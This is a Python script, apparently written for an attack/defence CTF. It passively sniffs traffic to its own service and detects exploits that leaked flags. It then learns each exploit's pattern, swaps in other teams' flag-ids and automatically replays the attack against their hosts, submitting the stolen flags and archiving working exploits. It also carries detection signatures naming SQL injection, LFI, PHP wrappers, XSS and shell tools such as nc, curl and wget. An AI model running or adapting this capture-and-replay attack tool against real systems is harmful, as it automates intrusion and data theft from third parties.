#!/usr/bin/env python3
"""
REFLEX — пассивный перехват эксплойта + автоматический контр-удар (A/D CTF).

Делит netns со своим вулнбоксом, сниффит eth0 raw-сокетом (AF_PACKET) —
НЕ трогает сам сервис, нулевая добавочная задержка в его хот-пате.

Конвейер:
  capture (raw socket, пассивно)
    -> reassemble (per-flow буфер запрос/ответ)
    -> detect: ответ НАШЕГО сервиса (SELF:PORT) содержит флаг + запрос бил по /note
               => подтверждённый успешный эксплойт
    -> attribute: src 10.60.N.x -> жертва 10.60.N.1  (блэклист: мы/геймсервер)
    -> rewrite: берём свежий flag-id ЖЕРТВЫ у геймсервера, подставляем в id=
    -> replay: GET http://victim:PORT<path>, вытаскиваем флаг
    -> submit: POST /submit геймсерверу

Защита своего сервака:
  - пассивный сниффинг (никакого inline-прокси);
  - отдельный процесс/контейнер с лимитами cgroup (ставятся в compose);
  - bounded queue + пул воркеров, дроп при переполнении;
  - rate-limit на жертву (он же дедуп под флудом);
  - таймаут на каждый исходящий коннект;
  - circuit breaker по loadavg;
  - блэклист инфраструктуры (чекер/геймсервер/мы/NOP).

Только stdlib. Нужен CAP_NET_RAW.
"""
import json
import os
import re
import socket
import struct
import threading
import time
import urllib.request
from urllib.parse import unquote
from collections import defaultdict, deque
from queue import Queue, Empty, Full

IFACE = os.environ.get("IFACE", "eth0")
SELF_IP = os.environ.get("SELF_IP", "10.60.13.1")
SERVICE_PORT = int(os.environ.get("SERVICE_PORT", "80"))
GS = os.environ.get("GS", "10.60.254.1")

# минимум настройки: NET_BASE и номер команды выводятся из SELF_IP (10.60.N.x),
# если не заданы явно. Оператору достаточно SELF_IP и GS.
_m = re.match(r"(\d+\.\d+)\.(\d+)\.\d+", SELF_IP)
NET_BASE = os.environ.get("NET_BASE") or (_m.group(1) if _m else "10.60")
SELF_TEAM = int(os.environ.get("SELF_TEAM") or (_m.group(2) if _m else "13"))

# по какому IP бить в ответ:
#   vulnbox — вулнбокс команды (10.60.N.1), сервис обычно там;
#   source  — ровно тот IP, С КОТОРОГО нас атаковали;
#   both    — сперва вулнбокс, затем источник; берём первый, что реально отдал флаг.
TARGET_MODE = os.environ.get("TARGET_MODE", "both").lower()
# на какой порт бить жертву (по умолчанию = порт нашего сервиса)
VICTIM_PORT = int(os.environ.get("VICTIM_PORT", str(SERVICE_PORT)))
# команды, по которым стрелять НЕЛЬЗЯ (инфраструктура + мы)
BLACKLIST_TEAMS = {SELF_TEAM, 254, 0, 255}

QUEUE_MAX = int(os.environ.get("QUEUE_MAX", "256"))
WORKERS = int(os.environ.get("WORKERS", "6"))
RL_INTERVAL = float(os.environ.get("RL_INTERVAL", "2.0"))   # не чаще раза в N c на жертву
REPLAY_TIMEOUT = float(os.environ.get("REPLAY_TIMEOUT", "2.0"))
LOAD_MAX = float(os.environ.get("LOAD_MAX", "16"))          # circuit breaker
MAX_INFLIGHT = int(os.environ.get("MAX_INFLIGHT", "16"))

# формат флага лиги. Для uralcup{...} оставь дефолт; для другой лиги задай FLAG_FORMAT.
FLAG_FORMAT = os.environ.get("FLAG_FORMAT", r"uralcup\{[^}]{1,80}\}")
FLAG_RE = re.compile(FLAG_FORMAT.encode())
REQLINE_RE = re.compile(rb"^(GET|POST)\s+(\S+)\s+HTTP", re.I)
ID_RE = re.compile(r"(\bid=)[0-9a-fA-F]+")

# сигнатуры техник эксплойта (для классификации и выбора стратегии реплея)
TECHNIQUE_SIGS = [
    ("sqli", re.compile(
        r"(?i)(union\s+select|\bor\s+'?1'?\s*=\s*'?1|'\s*or\s*'|--\s|/\*|#$|"
        r"\bsleep\s*\(|\bbenchmark\s*\(|information_schema|\bwaitfor\s+delay|"
        r"\bselect\b.{0,40}\bfrom\b|\bupdatexml\s*\(|\bextractvalue\s*\()")),
    ("lfi", re.compile(
        r"(?i)(\.\./|\.\.\\|/etc/passwd|/proc/self/|boot\.ini|"
        r"win\.ini|/var/www/|%00)")),
    ("php", re.compile(
        r"(?i)(php://|data://|expect://|zip://|phar://|<\?php|convert\.base64|"
        r"allow_url_include|phpinfo\s*\(|system\s*\(|passthru\s*\(|shell_exec\s*\()")),
    ("xss", re.compile(
        r"(?i)(<script|onerror\s*=|onload\s*=|javascript:|<img[^>]+src|"
        r"document\.cookie|<svg|onmouseover\s*=|<iframe)")),
    ("cmdi", re.compile(
        r"(?i)(;\s*(cat|id|uname|ls|whoami|curl|wget)\b|\|\s*(cat|id|nc|sh|bash)\b|"
        r"\$\(.+\)|`.+`|%0a|&&\s*(cat|id))")),
]


def classify(method, target, req):
    """Возвращает список тегов техник, найденных в запросе (по сигнатурам).
    Смотрим и сырой, и URL-декодированный вид — payload часто закодирован."""
    body = split_body(req).decode("latin1", "replace")
    hay = target + "\n" + body
    hay = hay + "\n" + unquote(target) + "\n" + unquote(body)
    tags = []
    for name, rx in TECHNIQUE_SIGS:
        if rx.search(hay):
            tags.append(name)
    return tags

LOGPATH = os.environ.get("REFLEX_LOG", "/var/log/reflex.jsonl")

STATS = defaultdict(int)
SLOCK = threading.Lock()
INFLIGHT = {"n": 0}
LAST_HIT = {}          # victim_ip -> ts (rate-limit / дедуп)
QUEUE = Queue(maxsize=QUEUE_MAX)

# наши недавние flag-id (чтобы находить слот flag-id в чужом эксплойте)
SELF_FIDS = deque(maxlen=12)

# intel: дедуп «кто чем нас щупает» (техники без утечки флага — XSS, php-пробы, recon)
INTEL_SEEN = {}          # (client_ip, tags) -> ts
INTEL_WINDOW = float(os.environ.get("INTEL_WINDOW", "15"))
INTEL_MAX = 4096

# кэш уже отправленных флагов: не пересдаём (дампы SQLi/LFI тащат кучу старых)
SUBMITTED = set()
SUBMITTED_MAX = 50000

# арсенал: сохранённые рабочие эксплойты (пойманные + успешно сдавшие флаг)
PROVEN = set()           # pattern_id уже сохранённых
EXPLOITS_PATH = os.environ.get("REFLEX_EXPLOITS", "/var/log/reflex_exploits.jsonl")


class PatternDB:
    """Обученная библиотека паттернов эксплойтов.

    Паттерн = (метод, шаблон пути, шаблон тела), где место нашего flag-id
    заменено маркером {FLAGID}. Учится на подтверждённых эксплойтах: как только
    в успешном запросе найден наш текущий flag-id — его позиция и есть слот,
    который при контр-ударе подставляется под flag-id жертвы. Работает на любом
    эндпоинте и для flag-id хоть в path, хоть в query, хоть в теле POST.
    """

    def __init__(self):
        self.pats = {}  # key -> dict
        self.lock = threading.Lock()

    def learn(self, method, path_tmpl, body_tmpl, where, example, tags=None):
        key = (method, path_tmpl, body_tmpl)
        with self.lock:
            p = self.pats.get(key)
            if p is None:
                p = self.pats[key] = {
                    "id": "P%d" % (len(self.pats) + 1),
                    "method": method, "path": path_tmpl, "body": body_tmpl,
                    "where": where, "count": 0, "example": example,
                    "techniques": sorted(set(tags or [])),
                    "first_seen": round(time.time(), 3),
                }
                is_new = True
            else:
                if tags:
                    p["techniques"] = sorted(set(p["techniques"]) | set(tags))
                is_new = False
            p["count"] += 1
            return p, is_new

    def snapshot(self):
        with self.lock:
            return [dict(v) for v in self.pats.values()]


PATTERNS = PatternDB()


def bump(k, n=1):
    with SLOCK:
        STATS[k] += n


def logj(obj):
    obj["ts"] = round(time.time(), 3)
    line = json.dumps(obj, ensure_ascii=False)
    print("[reflex] " + line, flush=True)
    try:
        with open(LOGPATH, "a") as f:
            f.write(line + "\n")
    except Exception:
        pass


def save_exploit(job, working_target, flag):
    """Сохраняет рабочий эксплойт в арсенал — один раз на паттерн, при успешной сдаче."""
    pid = job.get("pattern_id")
    with SLOCK:
        if pid in PROVEN:
            return
        PROVEN.add(pid)
    rec = {
        "ev": "saved_exploit", "pattern_id": pid, "method": job["method"],
        "path_tmpl": job["path_tmpl"], "body_tmpl": job.get("body_tmpl") or "",
        "strategy": job.get("strategy"), "techniques": job.get("techniques"),
        "flagid_needed": ("{FLAGID}" in job["path_tmpl"]
                          or "{FLAGID}" in (job.get("body_tmpl") or "")),
        "proved_on": working_target, "victim_team": job["victim_team"],
        "first_source": job.get("source_ip"), "example_flag": flag,
        "saved_at": round(time.time(), 3),
    }
    try:
        with open(EXPLOITS_PATH, "a") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    except Exception:
        pass
    bump("exploits_saved")
    logj({"ev": "saved_exploit", "pattern_id": pid, "method": job["method"],
          "path_tmpl": job["path_tmpl"][:80], "strategy": job.get("strategy"),
          "techniques": job.get("techniques"), "proved_on": working_target})


# ---------- захват (пассивно) ----------

def parse_packet(data):
    """Ethernet -> IPv4 -> TCP. Возвращает (src_ip, src_port, dst_ip, dst_port, payload) или None."""
    if len(data) < 14:
        return None
    eth_type = struct.unpack("!H", data[12:14])[0]
    if eth_type != 0x0800:
        return None
    ip = data[14:]
    if len(ip) < 20:
        return None
    ihl = (ip[0] & 0x0F) * 4
    proto = ip[9]
    if proto != 6:  # TCP
        return None
    src_ip = socket.inet_ntoa(ip[12:16])
    dst_ip = socket.inet_ntoa(ip[16:20])
    tcp = ip[ihl:]
    if len(tcp) < 20:
        return None
    src_port, dst_port = struct.unpack("!HH", tcp[0:4])
    doff = (tcp[12] >> 4) * 4
    payload = tcp[doff:]
    return src_ip, src_port, dst_ip, dst_port, payload


class Flow:
    __slots__ = ("req", "resp", "ts", "classified")

    def __init__(self):
        self.req = bytearray()
        self.resp = bytearray()
        self.ts = time.time()
        self.classified = False


FLOWS = {}
FLOWS_LOCK = threading.Lock()
MAXBUF = 65536


def gc_flows(now):
    with FLOWS_LOCK:
        for k, fl in list(FLOWS.items()):
            if now - fl.ts > 10:
                FLOWS.pop(k, None)


def on_packet(src_ip, src_port, dst_ip, dst_port, payload):
    # запрос к нашему сервису
    if dst_ip == SELF_IP and dst_port == SERVICE_PORT and payload:
        key = (src_ip, src_port)
        with FLOWS_LOCK:
            fl = FLOWS.get(key)
            if fl is None:
                fl = FLOWS[key] = Flow()
            if len(fl.req) < MAXBUF:
                fl.req += payload
            fl.ts = time.time()
            do_intel = (not fl.classified) and (b"\r\n\r\n" in fl.req)
            if do_intel:
                fl.classified = True
                req_snapshot = bytes(fl.req)
        if do_intel:
            intel(src_ip, req_snapshot)  # пассивная классификация, один раз на соединение
        return
    # ответ нашего сервиса
    if src_ip == SELF_IP and src_port == SERVICE_PORT and payload:
        key = (dst_ip, dst_port)
        with FLOWS_LOCK:
            fl = FLOWS.get(key)
            if fl is None:
                return
            if len(fl.resp) < MAXBUF:
                fl.resp += payload
            fl.ts = time.time()
            has_flag = FLAG_RE.search(fl.resp) is not None
            if has_flag:
                req = bytes(fl.req)
                FLOWS.pop(key, None)
            else:
                return
        detect(dst_ip, req)  # dst_ip = клиент (атакующий)


# ---------- детект + атрибуция ----------

def team_of_ip(ip):
    m = re.match(rf"{re.escape(NET_BASE)}\.(\d+)\.\d+", ip)
    return int(m.group(1)) if m else None


def split_body(req):
    i = req.find(b"\r\n\r\n")
    return req[i + 4:] if i >= 0 else b""


def learn_pattern(method, target, req):
    """Находит наш flag-id в запросе и строит шаблон эксплойта со слотом {FLAGID}.
    Возвращает (path_tmpl, body_tmpl, where, matched_fid) или None, если flag-id
    в запросе не найден (тогда сработает хардкод-фолбэк)."""
    body = split_body(req).decode("latin1", "replace")
    for fid in list(SELF_FIDS):
        if not fid:
            continue
        in_target = fid in target
        in_body = fid in body
        if not (in_target or in_body):
            continue
        path_tmpl = target.replace(fid, "{FLAGID}") if in_target else target
        body_tmpl = body.replace(fid, "{FLAGID}") if in_body else ""
        where = "path/query" if in_target else "body"
        return path_tmpl, body_tmpl, where, fid
    return None


def intel(client_ip, req):
    """Track-2: пассивно классифицируем ВХОДЯЩИЕ запросы по технике (даже без утечки
    флага) — intel-поток «кто чем нас щупает». Контр-удара тут нет: нечего реплеить.
    Жёстко дедуплено и ограничено, чтобы не спамить и не жрать память."""
    m = REQLINE_RE.search(req)
    if not m:
        return
    method = m.group(1).decode(errors="replace").upper()
    target = m.group(2).decode(errors="replace")
    tags = classify(method, target, req)
    if not tags:
        return
    bump("intel_hits")
    for t in tags:
        bump("intel_" + t)
    team = team_of_ip(client_ip)
    now = time.time()
    k = (client_ip, tuple(tags))
    with SLOCK:
        if len(INTEL_SEEN) > INTEL_MAX:
            INTEL_SEEN.clear()
        last = INTEL_SEEN.get(k, 0)
        if now - last < INTEL_WINDOW:
            return
        INTEL_SEEN[k] = now
    logj({"ev": "intel", "client": client_ip, "team": team,
          "techniques": tags, "method": method, "sample": unquote(target)[:100]})


def detect(client_ip, req):
    bump("responses_with_flag")
    m = REQLINE_RE.search(req)
    if not m:
        return
    method = m.group(1).decode(errors="replace").upper()
    target = m.group(2).decode(errors="replace")

    tags = classify(method, target, req)
    learned = learn_pattern(method, target, req)
    if learned is not None:
        # эксплойт с flag-id в запросе -> стратегия ПОДМЕНЫ flag-id (IDOR и т.п.)
        path_tmpl, body_tmpl, where, matched_fid = learned
        strategy, detect_src = "substitute", "learned"
        if "idor" not in tags:
            tags = tags + ["idor"]
    elif tags:
        # пейлоад-эксплойт без flag-id (SQLi/LFI/PHP-дамп) -> реплей КАК ЕСТЬ
        path_tmpl = target
        body_tmpl = split_body(req).decode("latin1", "replace") if method == "POST" else ""
        where, strategy, detect_src = "verbatim", "verbatim", "classified"
    elif target.startswith("/note"):
        # фолбэк, пока библиотека паттернов не прогрелась
        path_tmpl = ID_RE.sub(r"\g<1>{FLAGID}", target)
        if "{FLAGID}" not in path_tmpl:
            path_tmpl = target + ("&" if "?" in target else "?") + "id={FLAGID}"
        body_tmpl, where, strategy, detect_src = "", "path/query", "substitute", "fallback"
    else:
        bump("flag_resp_unknown_pattern")
        logj({"ev": "unknown_pattern", "client": client_ip,
              "method": method, "target": target[:80]})
        return

    bump("confirmed_exploits")
    pat, is_new = PATTERNS.learn(method, path_tmpl, body_tmpl, where,
                                 example=target, tags=tags)
    if is_new:
        bump("patterns_learned")
        logj({"ev": "learned_pattern", "pattern_id": pat["id"], "method": method,
              "path": path_tmpl[:80], "body": body_tmpl[:60], "slot": where,
              "strategy": strategy, "techniques": pat["techniques"], "via": detect_src})

    team = team_of_ip(client_ip)
    if team is None or team in BLACKLIST_TEAMS:
        bump("blacklisted_skips")
        logj({"ev": "skip_blacklist", "client": client_ip, "team": team,
              "pattern_id": pat["id"]})
        return

    vulnbox_ip = f"{NET_BASE}.{team}.1"
    # КУДА бить: явный выбор целей (и подробный лог, чтобы не было сомнений в IP)
    if TARGET_MODE == "source":
        targets = [client_ip]
    elif TARGET_MODE == "vulnbox":
        targets = [vulnbox_ip]
    else:  # both — сперва вулнбокс (сервис обычно там), затем ровно источник
        targets = [vulnbox_ip] + ([client_ip] if client_ip != vulnbox_ip else [])

    now = time.time()
    with SLOCK:
        last = LAST_HIT.get(team, 0)       # rate-limit по КОМАНДЕ (а не по IP)
        if now - last < RL_INTERVAL:
            STATS["rate_limited"] += 1
            return
        LAST_HIT[team] = now

    job = {"victim_team": team, "vulnbox_ip": vulnbox_ip, "source_ip": client_ip,
           "targets": targets, "method": method, "path_tmpl": path_tmpl,
           "body_tmpl": body_tmpl, "strategy": strategy,
           "techniques": pat["techniques"], "pattern_id": pat["id"]}
    try:
        QUEUE.put_nowait(job)
        bump("enqueued")
        logj({"ev": "captured", "source_ip": client_ip, "victim_team": team,
              "attack_from": client_ip, "will_hit": targets,
              "target_mode": TARGET_MODE, "pattern_id": pat["id"]})
    except Full:
        bump("queue_drops")


# ---------- контр-удар (воркеры) ----------

def loadavg():
    try:
        with open("/proc/loadavg") as f:
            return float(f.read().split()[0])
    except Exception:
        return 0.0


def http_get(url, timeout):
    with urllib.request.urlopen(url, timeout=timeout) as r:
        return r.read()


def http_post(url, data, timeout):
    req = urllib.request.Request(url, data=data, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()


def worker():
    while True:
        try:
            job = QUEUE.get(timeout=1)
        except Empty:
            continue
        try:
            handle(job)
        except Exception as e:
            bump("worker_errors")
            logj({"ev": "worker_error", "err": str(e), "job": job.get("victim_ip")})
        finally:
            QUEUE.task_done()


def handle(job):
    # circuit breaker
    if loadavg() > LOAD_MAX or INFLIGHT["n"] >= MAX_INFLIGHT:
        bump("circuit_skips")
        logj({"ev": "circuit_skip", "load": loadavg(), "inflight": INFLIGHT["n"]})
        return
    with SLOCK:
        INFLIGHT["n"] += 1
    try:
        team = job["victim_team"]
        strategy = job.get("strategy", "substitute")
        path_tmpl = job["path_tmpl"]
        body_raw = job.get("body_tmpl") or ""
        # 1) flag-id жертвы — нужен только для IDOR-подмены (один раз на команду)
        fid = None
        if strategy == "substitute" or "{FLAGID}" in path_tmpl or "{FLAGID}" in body_raw:
            try:
                meta = http_get(f"http://{GS}:{SERVICE_PORT}/flagids?team={team}",
                                REPLAY_TIMEOUT)
                fid = json.loads(meta)["flagid"]
            except Exception as e:
                bump("flagid_fail")
                logj({"ev": "flagid_fail", "victim_team": team, "err": str(e)})
                return
        path = path_tmpl.replace("{FLAGID}", fid) if fid else path_tmpl
        body_tmpl = body_raw.replace("{FLAGID}", fid) if fid else body_raw
        post_body = body_tmpl.encode("latin1", "replace") if body_tmpl else None

        # 2) replay по КАЖДОЙ цели из job["targets"], пока не отдаст флаг
        flags, working_target, tried = [], None, []
        for tgt in job["targets"]:
            url = f"http://{tgt}:{VICTIM_PORT}{path}"
            tried.append(tgt)
            try:
                if job["method"] == "POST" or post_body is not None:
                    body = http_post(url, post_body or b"", REPLAY_TIMEOUT)
                else:
                    body = http_get(url, REPLAY_TIMEOUT)
            except Exception as e:
                bump("replay_fail")
                logj({"ev": "replay_fail", "target": tgt, "url": url[:120], "err": str(e)})
                continue
            bump("replays_ok")
            seen = set()
            for mm in FLAG_RE.findall(body):
                f = mm.decode()
                if f not in seen:
                    seen.add(f)
                    flags.append(f)
                if len(flags) >= 64:
                    break
            if flags:
                working_target = tgt
                break  # нашли флаг на этой цели — дальше не долбим
            bump("replay_no_flag")
        if not flags:
            logj({"ev": "no_flag_any_target", "victim_team": team, "tried": tried})
            return
        bump("flags_captured", len(flags))

        # 3) submit всех найденных, пропуская уже отправленные (не хамим геймсерверу)
        with SLOCK:
            if len(SUBMITTED) > SUBMITTED_MAX:
                SUBMITTED.clear()
            fresh = [f for f in flags if f not in SUBMITTED]
            SUBMITTED.update(fresh)
        skipped = len(flags) - len(fresh)
        if skipped:
            bump("submit_skipped_cached", skipped)
        verdicts = {}
        accepted_flag = None
        for f in fresh:
            try:
                v = http_post(f"http://{GS}:{SERVICE_PORT}/submit",
                              f.encode(), REPLAY_TIMEOUT).decode().strip()
            except Exception as e:
                v = f"submit_fail:{e}"
            verdicts[v] = verdicts.get(v, 0) + 1
            bump(f"submit_{v}")
            if v == "ACCEPTED":
                accepted_flag = f
        # 4) при успехе — сохраняем рабочий эксплойт в арсенал
        if accepted_flag:
            save_exploit(job, working_target, accepted_flag)
        if not fresh and not verdicts:
            return  # все флаги уже сдавали — тихо выходим
        logj({"ev": "counterstrike", "victim_team": team,
              "attack_from": job.get("source_ip"), "hit_target": working_target,
              "tried_targets": tried, "strategy": strategy,
              "techniques": job.get("techniques"), "flagid": fid,
              "flags_found": len(flags), "new_submitted": len(fresh),
              "verdicts": verdicts, "accepted_flag": accepted_flag})
    finally:
        with SLOCK:
            INFLIGHT["n"] -= 1


# ---------- статистика ----------

def self_fid_poller():
    """Периодически узнаём СВОЙ текущий flag-id у геймсервера, чтобы находить его
    позицию в чужом эксплойте (слот для подстановки)."""
    while True:
        try:
            meta = http_get(f"http://{GS}:{SERVICE_PORT}/flagids?team={SELF_TEAM}", 2.0)
            fid = json.loads(meta)["flagid"]
            if fid and (not SELF_FIDS or SELF_FIDS[-1] != fid):
                SELF_FIDS.append(fid)
        except Exception:
            pass
        time.sleep(2)


def stats_loop():
    while True:
        time.sleep(5)
        gc_flows(time.time())
        with SLOCK:
            snap = dict(STATS)
        snap["queue"] = QUEUE.qsize()
        snap["inflight"] = INFLIGHT["n"]
        snap["patterns"] = len(PATTERNS.pats)
        print("[reflex][stats] " + json.dumps(snap), flush=True)
        pats = PATTERNS.snapshot()
        if pats:
            print("[reflex][patterns] " + json.dumps(
                [{"id": p["id"], "m": p["method"], "path": p["path"][:48],
                  "body": p["body"][:32], "slot": p["where"],
                  "techniques": p["techniques"], "hits": p["count"]}
                 for p in pats]), flush=True)


def main():
    logj({"ev": "boot", "self_ip": SELF_IP, "self_team": SELF_TEAM,
          "iface": IFACE, "gs": GS, "workers": WORKERS, "queue_max": QUEUE_MAX,
          "rl_interval": RL_INTERVAL, "blacklist": sorted(BLACKLIST_TEAMS),
          "target_mode": TARGET_MODE, "victim_port": VICTIM_PORT,
          "flag_format": FLAG_FORMAT, "exploits_file": EXPLOITS_PATH})
    for _ in range(WORKERS):
        threading.Thread(target=worker, daemon=True).start()
    threading.Thread(target=self_fid_poller, daemon=True).start()
    threading.Thread(target=stats_loop, daemon=True).start()

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    try:
        s.bind((IFACE, 0))
    except Exception as e:
        logj({"ev": "bind_fail", "iface": IFACE, "err": str(e)})
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    print(f"[reflex] sniffing {IFACE} for {SELF_IP}:{SERVICE_PORT}", flush=True)
    while True:
        try:
            data = s.recv(65535)
        except Exception:
            continue
        p = parse_packet(data)
        if not p:
            continue
        try:
            on_packet(*p)
        except Exception as e:
            bump("parse_errors")


if __name__ == "__main__":
    main()
